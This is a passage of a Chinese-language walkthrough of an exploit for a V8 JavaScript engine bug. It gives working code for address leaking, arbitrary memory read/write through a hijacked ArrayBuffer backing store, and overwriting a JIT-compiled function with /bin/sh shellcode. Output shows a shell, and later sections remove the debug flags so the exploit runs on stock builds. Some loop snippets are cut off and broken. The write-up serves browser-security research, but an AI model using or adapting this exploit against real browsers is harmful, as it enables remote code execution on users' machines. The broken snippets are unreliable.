        offset = i;
        return offset
      }
    }
    }
在`addr_of`函数中使用此偏移量，该函数用来检索任意对象的地址。
    function addr_of(obj){
      elements_array[0] = obj;
      return Int64.fromDouble(oob_array[elements_offset])
    }
    var test = {hello:"world"}
    elements_offset = find_offset_smi(1337);
    double_offset = find_offset_double(1.337)
    print(addr_of(test))
运行该脚本，可以成功打印出`test`对象的地址，证明`addr_of`函数确实可以工作：
    ../accidentalnday_release/d8 bug.js --allow-natives-syntax --turbo-escape --turbo-experimental --no-turbo-loop-peeling --trace-deopt
    Found offset: 36
    Found offset: 45
    0x00001b590f215e81
为了实现任意读写，我们利用ArrayBuffer并将其`backing store`指向我们想要读写的地址。
    arb_rw_arraybuffer = new ArrayBuffer(0x200)
首先我们需要找到该ArrayBuffer的偏移量。其中一种方式是搜索它的size值：
    print(find_offset_smi(0x200)) // Found offset: 55
通过查看内存，我们发现ArrayBuffer的`backing store`在`byte length`（即size）之后：
    V8 version 6.2.0 (candidate)
    d8> var ab = new ArrayBuffer(500)
    undefined
    d8> %DebugPrint(ab)
    DebugPrint: 0x25ed4e20bf69: [JSArrayBuffer]
     - map = 0xacfdf683179 [FastProperties]
     - prototype = 0x3dcd6128c391
     - elements = 0x18e996982241  [HOLEY_SMI_ELEMENTS]
     - embedder fields: 2
     - backing_store = 0x55973df4f220
     - byte_length = 500
     - neuterable
     - properties = 0x18e996982241  {}
     - embedder fields = {
        (nil)
        (nil)
     }
    0xacfdf683179: [Map]
     - type: JS_ARRAY_BUFFER_TYPE
     - instance size: 80
     - inobject properties: 0
     - elements kind: HOLEY_SMI_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x18e996982311 
     - instance descriptors (own) #0: 0x18e996982231 
     - layout descriptor: (nil)
     - prototype: 0x3dcd6128c391 
     - constructor: 0x3dcd6128c1c9 
     - code cache: 0x18e996982241 
     - dependent code: 0x18e996982241 
     - construction counter: 0
    [object ArrayBuffer]
    d8> ^C
    pwndbg> x/8gx 0x25ed4e20bf69-1
    0x25ed4e20bf68: 0x00000acfdf683179 100000; i++) {
       jitme(1)
    }
我们在寻找`- code = 0x17f593884c21 `
如果我们查看位于JIT函数指针0x38偏移量附近的地址，可以找到接近该值的地址。
这个值是用下面的JavaScript代码计算出来的：
    jitted_function_ptr = addr_of(jitme)
    print("JIT Function: "+ jitted_function_ptr)
    let JIT_ptr = read_64(jitted_function_ptr.add(0x38-1));
我们使用PwnTools生成的一个简单的/bin/sh shellcode：
    const SHELLCODE = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 99, 104, 111, 46, 114, 105, 1, 72, 49, 4, 36, 72, 137, 231, 104, 44, 98, 1, 1, 129, 52, 36, 1, 1, 1, 1, 73, 137, 224, 104, 46, 114, 105, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 69, 68, 59, 32, 47, 98, 105, 110, 80, 72, 184, 101, 99, 104, 111, 32, 80, 87, 78, 80, 73, 137, 225, 106, 1, 254, 12, 36, 65, 81, 65, 80, 87, 106, 59, 88, 72, 137, 230, 153, 15, 5]
    oob_array[shellcode_array_buffer_backing_store_offset] = JIT_ptr.to_double();
    let shell_code_writer = new Uint8Array(shellcode_array_buffer);
    shell_code_writer.set(SHELLCODE);
最后，我们执行这个JIT编译函数，从而实现代码执行并获得shell：
    jitme()
    ➜  accidentalnday ../accidentalnday_release/d8 nday.js --allow-natives-syntax --turbo-escape --turbo-experimental --no-turbo-loop-peeling --trace-deopt
    Found offset: 36
    Found offset: 45
    Found offset: 55
    Found offset: 65
    JIT Function: 0x00001294cf5af4a9
    JIT PTR: 0x000030b8f5904cc0
    $ id
    uid=1000(zon8) gid=1000(zon8) groups=1000(zon8),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
    $
## 移除CLI标志
目前，这个exploit只能和一系列非默认的CLI标志（如下所示）一起使用，正常安装的Chrome或者V8中并未激活这些标志。因此如果我们想要创建一个稳定的exploit，需要移除这些标志。
    ./d8 nday.js --allow-natives-syntax --turbo-escape --turbo-experimental --no-turbo-loop-peeling
``--allow-natives-syntax`用于`OptimizeOnNextFunctionCall`函数，该函数强制使用Turbofan
JIT优化并编译函数。删除这个标志并不难，通过创建循环来调用上千次函数可以触发JIT来编译这个函数。
修改前：
    %OptimizeFunctionOnNextCall(f);
修改后：
    for (i=0; i 循环分裂(loop
> splitting)是一种编译器优化技术。它试图拆分循环，拆分后的多个部分在相同主体内，但在索引范围的不同连续范围内迭代，以此来简化循环或消除依赖关系。
>
> 循环剥离(loop peeling)是循环分裂的一种特殊情况，它从循环中拆分出任何有问题的前/后几次迭代，并在循环体外部执行它们。
>
> ——[Loop Splitting - Wikipedia](https://en.wikipedia.org/wiki/Loop_splitting)
通过添加一些if语句，我们可以成功地避免循环剥离情况。这些if语句不改变exploit的功能性，但要对循环进行一定修改，从而让优化器不再剥离循环中的任何迭代。
修改前：
    for (var i = 0; i  2) {
                if (x % 2 == 0) {
                    o.a = 1;
                    b = false
                }
            }
            if (i == 0) {
                if (x % 2 == 0) {
                    o.a = 1;
                    b = false
                }
            }
            initial_oob_array[o.a] = 1.39064994160909e-309;
            o.a = x;
        }